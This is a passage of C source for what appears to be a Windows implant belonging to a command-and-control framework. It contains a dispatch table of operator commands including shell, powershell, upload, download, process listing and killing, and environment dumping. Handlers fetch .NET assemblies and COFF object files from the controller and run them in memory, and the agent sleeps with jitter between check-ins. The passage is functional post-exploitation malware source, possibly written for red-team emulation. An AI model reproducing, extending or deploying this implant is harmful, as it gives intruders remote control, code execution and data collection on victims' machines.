        cJSON *artarr = cJSON_CreateArray();
        cJSON *artone = cJSON_CreateObject();
        if (artarr && artone) {
            cJSON_AddStringToObject(artone, "base_artifact", "File Delete");
            cJSON_AddStringToObject(artone, "artifact", full);
            cJSON_AddItemToArray(artarr, artone);
            cJSON_AddItemToObject(wrap, "artifacts", artarr);
        } else {
            cJSON_Delete(artarr);
            cJSON_Delete(artone);
        }
    }
    resp->extra_json = cJSON_PrintUnformatted(wrap);
    cJSON_Delete(wrap);
    *output = (char *)malloc(512);
    if (!*output)
        return failf(resp, output, "error: out of memory");
    snprintf(*output, 512, "removed %s", arg);
    resp->user_output = *output;
    return 0;
}

static int task_mkdir(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    (void)a;
    (void)exit_now;
    if (!arg || !*arg)
        return failf(resp, output, "error: no path");
    if (mkdir_all(arg) != 0)
        return failf(resp, output, "error: cannot create %.400s", arg);
    *output = (char *)malloc(512);
    if (!*output)
        return failf(resp, output, "error: out of memory");
    snprintf(*output, 512, "created %s", arg);
    resp->user_output = *output;
    return 0;
}

/* Best-effort owner + integrity level for a process handle. */
static void proc_token_info(HANDLE hProc, char *user, size_t ucap, int *integrity) {
    HANDLE tok = NULL;
    DWORD need = 0;
    TOKEN_USER *tu = NULL;
    TOKEN_MANDATORY_LABEL *tml = NULL;
    user[0] = '\0';
    *integrity = 0;
    if (!OpenProcessToken(hProc, TOKEN_QUERY, &tok))
        return;
    GetTokenInformation(tok, TokenUser, NULL, 0, &need);
    if (need > 0 && need < 65536) {
        tu = (TOKEN_USER *)malloc(need);
        if (tu && GetTokenInformation(tok, TokenUser, tu, need, &need)) {
            char name[128], dom[128];
            DWORD nlen = sizeof(name), dlen = sizeof(dom);
            SID_NAME_USE use;
            if (LookupAccountSidA(NULL, tu->User.Sid, name, &nlen, dom, &dlen, &use))
                snprintf(user, ucap, "%s\\%s", dom, name);
        }
        free(tu);
    }
    need = 0;
    GetTokenInformation(tok, TokenIntegrityLevel, NULL, 0, &need);
    if (need > 0 && need < 65536) {
        tml = (TOKEN_MANDATORY_LABEL *)malloc(need);
        if (tml && GetTokenInformation(tok, TokenIntegrityLevel, tml, need, &need)) {
            DWORD nsub = *GetSidSubAuthorityCount(tml->Label.Sid);
            if (nsub > 0)
                *integrity = (int)*GetSidSubAuthority(tml->Label.Sid, nsub - 1);
        }
        free(tml);
    }
    CloseHandle(tok);
}

static const char *proc_arch(HANDLE hProc, int os64) {
    BOOL wow = FALSE;
    if (!os64)
        return "x86";
    if (IsWow64Process(hProc, &wow) && wow)
        return "x86";
    return "x64";
}

static int task_ps(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    HANDLE snap;
    PROCESSENTRY32 pe;
    SYSTEM_INFO si;
    cJSON *arr, *wrap;
    char *text = NULL;
    size_t len = 0, cap = 0;
    int os64;
    (void)a;
    (void)arg;
    (void)exit_now;
    GetNativeSystemInfo(&si);
    os64 = si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64;
    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE)
        return failf(resp, output, "error: snapshot failed");
    arr = cJSON_CreateArray();
    wrap = cJSON_CreateObject();
    text = (char *)malloc(4096);
    if (!arr || !wrap || !text) {
        CloseHandle(snap);
        cJSON_Delete(arr);
        cJSON_Delete(wrap);
        free(text);
        return failf(resp, output, "error: out of memory");
    }
    cap = 4096;
    text[0] = '\0';
    pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) {
        do {
            cJSON *row = cJSON_CreateObject();
            HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
            char bin[MAX_PATH], user[256];
            DWORD binlen = sizeof(bin);
            int integrity = 0;
            unsigned long long start = 0;
            bin[0] = '\0';
            if (h) {
                FILETIME ct, et, kt, ut;
                if (!QueryFullProcessImageNameA(h, 0, bin, &binlen))
                    bin[0] = '\0';
                proc_token_info(h, user, sizeof(user), &integrity);
                if (GetProcessTimes(h, &ct, &et, &kt, &ut))
                    start = filetime_to_unix(&ct);
            } else {
                user[0] = '\0';
            }
            if (row) {
                cJSON_AddNumberToObject(row, "process_id", (double)pe.th32ProcessID);
                cJSON_AddNumberToObject(row, "parent_process_id", (double)pe.th32ParentProcessID);
                cJSON_AddStringToObject(row, "architecture", h ? proc_arch(h, os64) : "");
                cJSON_AddStringToObject(row, "bin_path", bin);
                cJSON_AddStringToObject(row, "name", pe.szExeFile);
                cJSON_AddStringToObject(row, "user", user);
                if (integrity)
                    cJSON_AddNumberToObject(row, "integrity_level", (double)integrity);
                if (start)
                    cJSON_AddNumberToObject(row, "start_time", (double)start);
                cJSON_AddItemToArray(arr, row);
            }
            if (h)
                CloseHandle(h);
            {
                size_t n = strlen(pe.szExeFile) + 32;
                if (len + n > cap) {
                    char *grown = (char *)realloc(text, cap * 2);
                    if (!grown)
                        break;
                    text = grown;
                    cap *= 2;
                }
                len += (size_t)snprintf(text + len, cap - len, "%lu %lu %s\n",
                                        (unsigned long)pe.th32ProcessID,
                                        (unsigned long)pe.th32ParentProcessID, pe.szExeFile);
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    cJSON_AddItemToObject(wrap, "processes", arr);
    resp->extra_json = cJSON_PrintUnformatted(wrap);
    cJSON_Delete(wrap);
    *output = text;
    resp->user_output = *output;
    return 0;
}

static int task_kill(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    char *end = NULL;
    long pid;
    HANDLE h;
    (void)a;
    (void)exit_now;
    if (!arg || *arg == '\0')
        return failf(resp, output, "error: usage: kill <pid>");
    pid = strtol(arg, &end, 10);
    if (end == arg || pid <= 0 || pid > 99999999)
        return failf(resp, output, "error: usage: kill <pid>");
    while (*end == ' ' || *end == '\t')
        end++;
    if (*end != '\0')
        return failf(resp, output, "error: usage: kill <pid>");
    h = OpenProcess(PROCESS_TERMINATE, FALSE, (DWORD)pid);
    if (!h)
        return failf(resp, output, "error: cannot open %ld (%lu)", pid, (unsigned long)GetLastError());
    if (!TerminateProcess(h, 1)) {
        CloseHandle(h);
        return failf(resp, output, "error: cannot kill %ld (%lu)", pid, (unsigned long)GetLastError());
    }
    CloseHandle(h);
    *output = (char *)malloc(64);
    if (!*output)
        return failf(resp, output, "error: out of memory");
    snprintf(*output, 64, "killed %ld", pid);
    resp->user_output = *output;
    {
        char pidbuf[32];
        snprintf(pidbuf, sizeof(pidbuf), "pid %ld", pid);
        resp->extra_json = artifacts_fragment("Process Kill", pidbuf);
    }
    return 0;
}

static int task_load(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    (void)a;
    (void)exit_now;
    if (!arg || !*arg || !set_command_allowed(arg, 1))
        return failf(resp, output, "error: unknown command %s", (arg && *arg) ? arg : "");
    *output = (char *)malloc(128);
    if (!*output)
        return failf(resp, output, "error: out of memory");
    snprintf(*output, 128, "loaded %.100s", arg);
    resp->user_output = *output;
    return 0;
}

static int task_unload(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    (void)a;
    (void)exit_now;
    if (!arg || !*arg)
        return failf(resp, output, "error: unknown command ");
    if (protected_runtime(arg))
        return failf(resp, output, "error: cannot unload %s", arg);
    if (!set_command_allowed(arg, 0))
        return failf(resp, output, "error: unknown command %s", arg);
    *output = (char *)malloc(128);
    if (!*output)
        return failf(resp, output, "error: out of memory");
    snprintf(*output, 128, "unloaded %.100s", arg);
    resp->user_output = *output;
    return 0;
}

/* Build an {"artifacts":[{...}]} fragment (caller frees), or NULL. */
static char *artifacts_fragment(const char *base, const char *artifact) {
    cJSON *arr = cJSON_CreateArray();
    cJSON *one = cJSON_CreateObject();
    cJSON *wrap = cJSON_CreateObject();
    char *out = NULL;
    if (!arr || !one || !wrap) {
        cJSON_Delete(arr);
        cJSON_Delete(one);
        cJSON_Delete(wrap);
        return NULL;
    }
    cJSON_AddStringToObject(one, "base_artifact", base);
    cJSON_AddStringToObject(one, "artifact", artifact);
    cJSON_AddItemToArray(arr, one);
    cJSON_AddItemToObject(wrap, "artifacts", arr);
    out = cJSON_PrintUnformatted(wrap);
    cJSON_Delete(wrap);
    return out;
}

static int task_exit(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    (void)a;
    (void)arg;
    (void)output;
    resp->user_output = "exiting";
    *exit_now = 1;
    return 0;
}

static int task_execute_assembly(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    char file_id[128], args[8192], tmp[MAX_PATH], err[256], *exec_out = NULL;
    char ascratch[8192];
    const char *as;
    (void)exit_now;
    task_param(arg, "assembly_file", file_id, sizeof(file_id));
    as = task_param(arg, "assembly_arguments", ascratch, sizeof(ascratch));
    strncpy(args, as, sizeof(args) - 1);
    args[sizeof(args) - 1] = '\0';
    if (file_id[0] == '\0')
        return failf(resp, output, "error: no assembly file id");
    if (fetch_to_temp(a, resp, file_id, tmp, sizeof(tmp), err, sizeof(err)) != 0)
        return failf(resp, output, "error: %s", err);
    if (execasm_run(tmp, args, &exec_out) != 0) {
        int rc;
        DeleteFileA(tmp);
        rc = failf(resp, output, "%s", exec_out ? exec_out : "error: assembly failed");
        free(exec_out);
        return rc;
    }
    DeleteFileA(tmp);
    *output = exec_out;
    resp->user_output = *output;
    {
        char artifact[8320];
        snprintf(artifact, sizeof(artifact), "execute_assembly %s", args);
        resp->extra_json = artifacts_fragment("Process Create", artifact);
    }
    return 0;
}

static int task_execute_coff(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    char file_id[128], fn[256], err[256], *coff_out = NULL;
    unsigned char *obj = NULL, *argsbuf = NULL, *hexbuf = NULL;
    size_t objlen = 0, argslen = 0, hexlen = 0;
    const char *hexargs = "";
    cJSON *root;
    int timeout;
    unsigned total;
    (void)exit_now;
    task_param(arg, "bof_file", file_id, sizeof(file_id));
    task_param(arg, "function_name", fn, sizeof(fn));
    if (fn[0] == '\0')
        strcpy(fn, "go");
    /* coff_arguments can be large (base64 payloads), so read it straight
     * off the parsed blob instead of through a fixed scratch buffer. */
    root = cJSON_Parse(arg ? arg : "");
    if (root) {
        cJSON *v = cJSON_GetObjectItemCaseSensitive(root, "coff_arguments");
        if (cJSON_IsString(v) && v->valuestring)
            hexargs = v->valuestring;
        if (hexargs[0] != '\0') {
            hexbuf = unhex(hexargs, &hexlen);
            if (!hexbuf) {
                cJSON_Delete(root);
                return failf(resp, output, "error: bad coff_arguments hex");
            }
        }
        cJSON_Delete(root);
    }
    if (!hexbuf) {
        hexbuf = (unsigned char *)malloc(4);
        if (!hexbuf)
            return failf(resp, output, "error: out of memory");
        memset(hexbuf, 0, 4);
        hexlen = 4;
    }
    if (hexlen < 4) {
        free(hexbuf);
        return failf(resp, output, "error: bad coff_arguments: truncated");
    }
    total = (unsigned)hexbuf[0] | ((unsigned)hexbuf[1] << 8) |
            ((unsigned)hexbuf[2] << 16) | ((unsigned)hexbuf[3] << 24);
    if (total != hexlen - 4) {
        free(hexbuf);
        return failf(resp, output, "error: bad coff_arguments: total %u, have %u", total,
                     (unsigned)(hexlen - 4));
    }
    argsbuf = hexbuf;
    argslen = hexlen;
    timeout = task_param_number(arg, "timeout", 30);
    if (timeout < 1)
        timeout = 1;
    if (timeout > 86400)
        timeout = 86400;
    if (file_id[0] == '\0') {
        free(argsbuf);
        return failf(resp, output, "error: no bof file id");
    }
    if (fetch_to_mem(a, resp, file_id, &obj, &objlen, err, sizeof(err)) != 0) {
        free(argsbuf);
        return failf(resp, output, "error: %s", err);
    }
    if (objlen == 0) {
        free(obj);
        free(argsbuf);
        return failf(resp, output, "error: empty bof");
    }
    if (coff_run(obj, objlen, fn, argsbuf, argslen, timeout, &coff_out) != 0) {
        int rc;
        free(obj);
        free(argsbuf);
        rc = failf(resp, output, "%s", coff_out ? coff_out : "error: bof failed");
        free(coff_out);
        return rc;
    }
    free(obj);
    free(argsbuf);
    *output = coff_out;
    resp->user_output = *output;
    {
        char artifact[512];
        snprintf(artifact, sizeof(artifact), "execute_coff %s", fn);
        resp->extra_json = artifacts_fragment("Process Create", artifact);
    }
    return 0;
}

static int task_whoami(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    char user[512], domain[256], combined[1024];
    (void)a;
    (void)arg;
    (void)exit_now;
    sysinfo_user(user, sizeof(user));
    domain[0] = '\0';
    if (!GetEnvironmentVariableA("USERDNSDOMAIN", domain, sizeof(domain)))
        GetEnvironmentVariableA("USERDOMAIN", domain, sizeof(domain));
    if (user[0] && domain[0] && !strchr(user, '\\'))
        snprintf(combined, sizeof(combined), "%s\\%s", domain, user);
    else if (user[0])
        snprintf(combined, sizeof(combined), "%s", user);
    else if (domain[0])
        snprintf(combined, sizeof(combined), "%s", domain);
    else
        snprintf(combined, sizeof(combined), "unknown user");
    *output = _strdup(combined);
    if (!*output)
        return failf(resp, output, "error: out of memory");
    resp->user_output = *output;
    return 0;
}

static int task_env(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    char *block, *p;
    size_t len = 0, cap = 0;
    (void)a;
    (void)arg;
    (void)exit_now;
    block = GetEnvironmentStringsA();
    if (!block)
        return failf(resp, output, "error: no environment");
    *output = NULL;
    for (p = block; *p; p += strlen(p) + 1) {
        size_t elen = strlen(p);
        char *grown;
        if (len + elen + 2 > cap) {
            cap = len + elen + 2;
            grown = (char *)realloc(*output, cap ? cap : 1);
            if (!grown) {
                free(*output);
                *output = NULL;
                FreeEnvironmentStringsA(block);
                return failf(resp, output, "error: out of memory");
            }
            *output = grown;
        }
        memcpy(*output + len, p, elen);
        len += elen;
        (*output)[len++] = '\n';
    }
    FreeEnvironmentStringsA(block);
    if (!*output)
        *output = _strdup("");
    else
        (*output)[len] = '\0';
    if (!*output)
        return failf(resp, output, "error: out of memory");
    resp->user_output = *output;
    return 0;
}

static int task_pwd(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    char dir[MAX_PATH];
    (void)a;
    (void)arg;
    (void)exit_now;
    if (!GetCurrentDirectoryA(sizeof(dir), dir))
        return failf(resp, output, "error: cannot read working directory");
    *output = _strdup(dir);
    if (!*output)
        return failf(resp, output, "error: out of memory");
    resp->user_output = *output;
    return 0;
}

static int task_cd(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    char dir[MAX_PATH];
    const char *p;
    (void)a;
    (void)exit_now;
    p = arg ? arg : "";
    while (*p == ' ' || *p == '\t')
        p++;
    if (!*p)
        return failf(resp, output, "error: usage: cd <path>");
    if (!SetCurrentDirectoryA(p))
        return failf(resp, output, "error: cannot change to %.400s", p);
    if (!GetCurrentDirectoryA(sizeof(dir), dir))
        snprintf(dir, sizeof(dir), "%s", p);
    *output = (char *)malloc(MAX_PATH + 32);
    if (!*output)
        return failf(resp, output, "error: out of memory");
    snprintf(*output, MAX_PATH + 32, "changed to %s", dir);
    resp->user_output = *output;
    return 0;
}

/* Split "a b" (exactly two whitespace-separated fields) for cp/mv. */
static int split_two(const char *s, char *first, size_t fcap, char *second, size_t scap) {
    const char *a, *b, *end;
    size_t n;
    if (!s)
        return -1;
    while (*s == ' ' || *s == '\t' || *s == '\r' || *s == '\n')
        s++;
    a = s;
    while (*s && *s != ' ' && *s != '\t' && *s != '\r' && *s != '\n')
        s++;
    end = s;
    while (*s == ' ' || *s == '\t' || *s == '\r' || *s == '\n')
        s++;
    b = s;
    while (*s && *s != ' ' && *s != '\t' && *s != '\r' && *s != '\n')
        s++;
    n = s - b;
    while (*s == ' ' || *s == '\t' || *s == '\r' || *s == '\n')
        s++;
    if (a == end || n == 0 || *s != '\0')
        return -1;
    if ((size_t)(end - a) >= fcap || n >= scap)
        return -1;
    memcpy(first, a, (size_t)(end - a));
    first[end - a] = '\0';
    memcpy(second, b, n);
    second[n] = '\0';
    return 0;
}

/* Read source/destination from a cp/mv blob: named keys, else a
 * hand-built "a b" arguments string. */
static int twin_paths(const char *arg, char *src, size_t scap, char *dst, size_t dcap) {
    cJSON *root, *v;
    int rc = -1;
    task_param(arg, "source", src, scap);
    task_param(arg, "destination", dst, dcap);
    if (src[0] && dst[0])
        return 0;
    root = cJSON_Parse(arg ? arg : "");
    if (root) {
        v = cJSON_GetObjectItemCaseSensitive(root, "arguments");
        if (cJSON_IsString(v) && v->valuestring)
            rc = split_two(v->valuestring, src, scap, dst, dcap);
        cJSON_Delete(root);
        return rc;
    }
    return split_two(arg, src, scap, dst, dcap);
}

static int task_cp(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    char src[MAX_PATH], dst[MAX_PATH];
    (void)a;
    (void)exit_now;
    if (twin_paths(arg, src, sizeof(src), dst, sizeof(dst)) != 0)
        return failf(resp, output, "error: usage: cp <source> <destination>");
    {
        /* INVALID carries the directory bit, so check validity first;
         * a missing source then reports from CopyFile below. */
        DWORD attrs = GetFileAttributesA(src);
        if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY))
            return failf(resp, output, "error: not a file: %.400s", src);
    }
    if (!CopyFileA(src, dst, FALSE))
        return failf(resp, output, "error: cannot copy %.200s -> %.200s", src, dst);
    *output = (char *)malloc(MAX_PATH * 2 + 32);
    if (!*output)
        return failf(resp, output, "error: out of memory");
    snprintf(*output, MAX_PATH * 2 + 32, "copied %s -> %s", src, dst);
    resp->user_output = *output;
    return 0;
}

static int task_mv(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    char src[MAX_PATH], dst[MAX_PATH];
    (void)a;
    (void)exit_now;
    if (twin_paths(arg, src, sizeof(src), dst, sizeof(dst)) != 0)
        return failf(resp, output, "error: usage: mv <source> <destination>");
    if (!MoveFileA(src, dst)) {
        /* MoveFile cannot cross volumes; copy+delete covers that. */
        if (!CopyFileA(src, dst, FALSE) || !DeleteFileA(src))
            return failf(resp, output, "error: cannot move %.200s -> %.200s", src, dst);
    }
    *output = (char *)malloc(MAX_PATH * 2 + 32);
    if (!*output)
        return failf(resp, output, "error: out of memory");
    snprintf(*output, MAX_PATH * 2 + 32, "moved %s -> %s", src, dst);
    resp->user_output = *output;
    return 0;
}

static int task_ipconfig(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    char host[256], ips[4096];
    (void)a;
    (void)arg;
    (void)exit_now;
    sysinfo_host(host, sizeof(host));
    sysinfo_ips(ips, sizeof(ips));
    *output = (char *)malloc(sizeof(host) + sizeof(ips) + 32);
    if (!*output)
        return failf(resp, output, "error: out of memory");
    if (ips[0])
        snprintf(*output, sizeof(host) + sizeof(ips) + 32, "host: %s\n%s", host, ips);
    else
        snprintf(*output, sizeof(host) + sizeof(ips) + 32, "host: %s", host);
    resp->user_output = *output;
    return 0;
}

static int task_uptime(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    unsigned long long secs;
    unsigned days, hours, mins;
    (void)a;
    (void)arg;
    (void)exit_now;
    secs = GetTickCount64() / 1000;
    days = (unsigned)(secs / 86400);
    secs %= 86400;
    hours = (unsigned)(secs / 3600);
    secs %= 3600;
    mins = (unsigned)(secs / 60);
    secs %= 60;
    /* Each part is at most 11 chars (%u range + suffix) in a 24-byte
     * window, so the 128-byte buffer cannot overflow. */
    *output = (char *)malloc(128);
    if (!*output)
        return failf(resp, output, "error: out of memory");
    {
        char *p = *output + snprintf(*output, 8, "uptime ");
        if (days > 0)
            p += snprintf(p, 24, "%ud", days);
        if (hours > 0 || days > 0)
            p += snprintf(p, 24, "%uh", hours);
        if (mins > 0 || hours > 0 || days > 0)
            p += snprintf(p, 24, "%um", mins);
        snprintf(p, 24, "%us", (unsigned)secs);
    }
    resp->user_output = *output;
    return 0;
}

/* Dispatch table. To add a command, add a row plus a task_* handler here,
 * a row in the Go table (agent_code/tasks.go) and a row in the container
 * commandSpecs. */
static const struct {
    const char *name;
    task_fn_t fn;
} task_table[] = {
    {"shell", task_shell},
    {"powershell", task_powershell},
    {"sleep", task_sleep_cmd},
    {"ls", task_ls},
    {"download", task_download},
    {"upload", task_upload},
    {"rm", task_rm},
    {"mkdir", task_mkdir},
    {"ps", task_ps},
    {"kill", task_kill},
    {"execute_assembly", task_execute_assembly},
    {"execute_coff", task_execute_coff},
    {"whoami", task_whoami},
    {"env", task_env},
    {"pwd", task_pwd},
    {"cd", task_cd},
    {"cp", task_cp},
    {"mv", task_mv},
    {"ipconfig", task_ipconfig},
    {"uptime", task_uptime},
    {"load", task_load},
    {"unload", task_unload},
    {"exit", task_exit},
};

#define TASK_TABLE_LEN (sizeof(task_table) / sizeof(task_table[0]))

/* Runtime allowlist, seeded from the build-time list. load/unload flip
 * entries; resyncs if the build list changes under it (tests). */
static int allow_init = 0;
static int allow_flags[32];
_Static_assert(TASK_TABLE_LEN <= 32, "allowlist too small");
static char allow_csv[1024];

static void allow_sync(void) {
    size_t i;
    if (allow_init && strcmp(allow_csv, CFG_COMMANDS) == 0)
        return;
    strncpy(allow_csv, CFG_COMMANDS, sizeof(allow_csv) - 1);
    allow_csv[sizeof(allow_csv) - 1] = '\0';
    if (CFG_COMMANDS[0] == '\0') {
        for (i = 0; i < TASK_TABLE_LEN; i++)
            allow_flags[i] = 1;
    } else {
        for (i = 0; i < TASK_TABLE_LEN; i++)
            allow_flags[i] = command_in_list(CFG_COMMANDS, task_table[i].name);
    }
    allow_init = 1;
}

static int table_index(const char *name) {
    size_t i;
    for (i = 0; i < TASK_TABLE_LEN; i++) {
        if (strcmp(name, task_table[i].name) == 0)
            return (int)i;
    }
    return -1;
}

/* Flip one command at runtime; 0 when unknown. */
static int set_command_allowed(const char *name, int allowed) {
    int idx;
    allow_sync();
    idx = table_index(name);
    if (idx < 0)
        return 0;
    allow_flags[idx] = allowed;
    return 1;
}

static int protected_runtime(const char *name) {
    return strcmp(name, "exit") == 0 || strcmp(name, "load") == 0 || strcmp(name, "unload") == 0;
}

int task_dispatch(agent_t *a, const task_t *t, response_t *resp, char **output, int *exit_now) {
    char scratch[8192];
    const char *arg;
    *output = NULL;
    *exit_now = 0;
    resp->task_id = t->id;
    resp->user_output = "";
    resp->completed = 1;
    resp->status = "success";
    resp->extra_json = NULL;
    arg = task_arg(t->parameters, scratch, sizeof(scratch));
    {
        int idx = table_index(t->command);
        if (idx < 0) {
            resp->status = "error: unknown command";
            resp->user_output = resp->status;
            return 0;
        }
        allow_sync();
        if (!allow_flags[idx]) {
            *output = (char *)malloc(128);
            if (*output) {
                snprintf(*output, 128, "error: command %.32s not included in this build",
                         t->command);
                resp->status = *output;
            } else {
                resp->status = "error: command not included in this build";
            }
            resp->user_output = resp->status;
            return 0;
        }
        return task_table[idx].fn(a, arg, resp, output, exit_now);
    }
}

void task_sleep(int interval, int jitter) {
    int ms, delta, low, span;
    if (interval <= 0)
        return;
    if (jitter <= 0) {
        Sleep((DWORD)interval * 1000);
        return;
    }
    delta = interval * jitter / 100;
    low = interval - delta;
    if (low < 0)
        low = 0;
    span = interval + delta - low;
    ms = low + (span > 0 ? rand() % (span + 1) : 0);
    Sleep((DWORD)ms * 1000);
}
